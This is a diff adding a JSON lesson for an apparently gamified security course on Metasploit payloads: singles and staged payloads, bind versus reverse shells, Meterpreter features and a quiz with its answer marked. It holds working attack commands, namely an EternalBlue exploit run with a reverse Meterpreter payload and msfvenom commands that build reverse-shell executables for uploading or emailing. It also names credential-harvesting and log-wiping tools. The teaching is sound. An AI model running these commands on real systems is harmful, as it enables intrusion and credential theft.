@@ -1,0 +1,85 @@
+{
+    "id": "l4",
+    "chapterId": "ch_7",
+    "title": "Payloads: Singles, Stagers, and Stages 💣",
+    "description": "Deep dive into the code that runs after exploitation.",
+    "xpReward": 35,
+    "estimatedMinutes": 10,
+    "section": "Payloads",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "What is a Payload? 📦",
+            "content": "# The 'After' Code\n\nAn **exploit** opens the door. The **payload** is what you send through the door to do the actual work.\n\n**Analogy**: The exploit is the crowbar prying open the window. The payload is the thief climbing inside to steal the TV.\n\n**Common Payload Goals:**\n- **Shell**: Interactive command line (`cmd/unix/interact`).\n- **Meterpreter**: Advanced, extensible payload with file system access, keylogging, and more.\n- **Add User**: Create a new administrator account.\n- **Execute Command**: Run a single command and exit."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "text",
+            "title": "Payload Types: Singles vs. Staged 🧩",
+            "content": "# Size Matters (in exploits)\n\nExploits often have limited space to insert code (buffer size). Metasploit solves this with two payload delivery methods:\n\n**1. Single Payload (Inline)**\n- **Naming**: `[os]/[arch]/[name]` (e.g., `linux/x64/shell_reverse_tcp`)\n- **Contains**: Everything needed in one blob.\n- **Size**: Large.\n- **Use Case**: When space is abundant.\n\n**2. Staged Payload**\n- **Naming**: `[os]/[arch]/[stage]/[stager]` (e.g., `linux/x64/shell/reverse_tcp`)\n- **Contains**: A tiny **stager** that connects back and downloads the larger **stage**.\n- **Size**: Very small initial footprint.\n- **Use Case**: Tight buffer constraints."
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "Payload Naming 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "In Metasploit, a payload named `windows/x64/meterpreter/reverse_tcp` indicates:",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "A single payload containing the full Meterpreter code.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "A staged payload with a stager that downloads Meterpreter.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "A payload that only works on Linux.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "A payload that connects out from the attacker to the target.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "The slash between 'meterpreter' and 'reverse_tcp' indicates a staged payload: stager/reverse_tcp, stage/meterpreter.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "text",
+            "title": "Bind Shell vs. Reverse Shell 🔄",
+            "content": "# Connection Direction is Critical\n\n**Bind Shell**\n- **Mechanism**: Payload opens a **listening port** on the **target**.\n- **Attacker Action**: Connects **to** the target.\n- **Pros**: Simple.\n- **Cons**: Blocked by **inbound firewall** rules. Easily detected.\n- **Naming**: `shell_bind_tcp`\n\n**Reverse Shell**\n- **Mechanism**: Payload initiates a connection **from the target back to the attacker**.\n- **Attacker Action**: Listens for incoming connection.\n- **Pros**: Bypasses inbound firewall rules (outbound is often allowed). Stealthier.\n- **Cons**: Attacker must have a routable IP or port forward.\n- **Naming**: `shell_reverse_tcp`\n\n**99% of the time, you will use a Reverse Shell.**"
+        },
+        {
+            "id": "s_l4_5",
+            "type": "code",
+            "title": "Setting a Reverse Payload 🔄",
+            "content": "Let's see how to configure a typical reverse TCP Meterpreter payload for a Windows exploit.",
+            "codeSnippet": "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.0.0.5\n\n# Choose the staged Meterpreter reverse TCP payload\nmsf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Set YOUR Kali IP address\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.102\n\n# Set the port you'll listen on\nmsf6 exploit(ms17_010_eternalblue) > set LPORT 4444\n\nmsf6 exploit(ms17_010_eternalblue) > exploit",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_6",
+            "type": "text",
+            "title": "Meterpreter: The Advanced Payload ⚡",
+            "content": "# More Than Just a Shell\n\n**Meterpreter** is Metasploit's flagship payload. It runs entirely **in memory** (no disk writes) and uses **encrypted communication**.\n\n**Key Features:**\n- **Core Commands**: `sysinfo`, `getuid`, `ps`, `migrate`.\n- **File System**: `download`, `upload`, `cd`, `ls`.\n- **Networking**: `portfwd`, `route`.\n- **Privilege Escalation**: `getsystem`.\n- **Credential Harvesting**: `hashdump`, `kiwi` (Mimikatz integration).\n- **Stealth**: `timestomp`, `clearev`.\n\n**Getting Meterpreter**: Simply set `PAYLOAD` to `[os]/[arch]/meterpreter/reverse_tcp`."
+        },
+        {
+            "id": "s_l4_7",
+            "type": "tip",
+            "title": "Pro Tip: msfvenom for Standalone Payloads 🚀",
+            "content": "## Generating Executables\n\nNeed a standalone `.exe` or `.elf` file to upload or email? Use `msfvenom`.\n\n```bash\n# Generate a reverse shell executable for Windows\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f exe -o shell.exe\n\n# Generate a reverse shell for Linux\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf -o shell.elf\n```\n\n**Then**: Set up a listener in Metasploit using `exploit/multi/handler` with matching payload and options."
+        }
+    ]
+}
